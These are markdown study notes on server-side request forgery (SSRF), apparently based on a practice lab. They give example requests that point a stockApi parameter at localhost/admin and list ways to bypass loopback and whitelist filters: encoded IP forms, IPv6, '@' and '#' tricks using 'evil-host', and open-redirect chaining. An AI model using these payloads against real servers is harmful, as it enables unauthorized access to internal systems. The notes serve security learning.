# ssrf

## basic

- in an `SSRF` attack against a server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its `loopback` network interface
- this typically involves supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter)

```
POST /product/stock HTTP/1.0
...
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

->

```
POST /product/stock HTTP/1.0
...
stockApi=http://localhost/admin
```

- the `stockApi` request might not be translated just forwarded
- the HTTP serves trusted so every request from there would be trusted too

## blocked loopback

> some applications block input containing hostnames like `127.0.0.1` and `localhost` or URLs like /`admin`, in this situation, you can often circumvent the filter using the following techniques:

- alternative IP representation of `127.0.0.1`, such as `2130706433` (decimal), `017700000001` (octal), or `127.1` (shortened)

```
127      .  0       .  0       .  1
01111111   00000000   00000000   00000001
```

->

```
127*256³ + 0*256² + 0*256¹ + 1
= 127*16777216 + 1
= 2130706432 + 1
= 2130706433 (decimal)
```

- `127.0.0.2`, `127.1.1.1`, `127.255.255.254` or any `127.x.x.x`
- `0.0.0.0` often resolves to `localhost` on many stacks
- `[::1]` IPv6 loopback (the bracketed form for URLs)
- `[::]` IPv6 "all interfaces" sometimes works
- `[0000::1]`, `[::ffff:127.0.0.1]` IPv6-mapped IPv4

- register your own domain name that resolves to 127.0.0.1
- `obfuscate` blocked strings using URL encoding or case variation
- Provide a URL that you control, which redirects to the target URL
- switching from an `http` to `https`

## whitelisted urls

> some applications only allow inputs that match, a whitelist of permitted values, the filter may look for a match at the beginning of the input, or contained within in it, you may be able to bypass this filter by exploiting inconsistencies in URL parsing

- can embed credentials in a URL before the hostname, using the `@` character:

`https://expected-host:fakepassword@evil-host`

- can use the `#` character to indicate a URL fragment:

`https://evil-host#expected-host`

- can leverage the `DNS` naming hierarchy to place required input into a fully-qualified DNS name that you control:

`https://expected-host.evil-host`

- can URL-encode characters to confuse the URL-parsing code
- can double-encoding characters

## open redirect

> the goal is to make a redirect server to exploit the open redirect endpoint

- the url might contain query parameters that after passing the validation would redirect the page (status code 3xx)
- browsing the page might contain links/buttons that would redirect the page

```
GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
...
```

- the `&path=/product?productId=3` part probably the page it redirect the server to
- switching it to `&path=http://x.x.x.x/admin` might redirect to the admin page in a servers side request
- so the `/product/nextProduct?currentProductId=2&path=http://x.x.x.x/admin` inserted in a `stockApi` request might return the admin page

```
...
stockApi=/product/nextProduct?currentProductId=2&path=http://x.x.x.x/admin
```

- of course the `stockApi` might called differently
- the redirect query param could be called differently too, a couple ideas

```
url path next redirect redirectUrl returnUrl return dest destination continue goto target r u link out
```
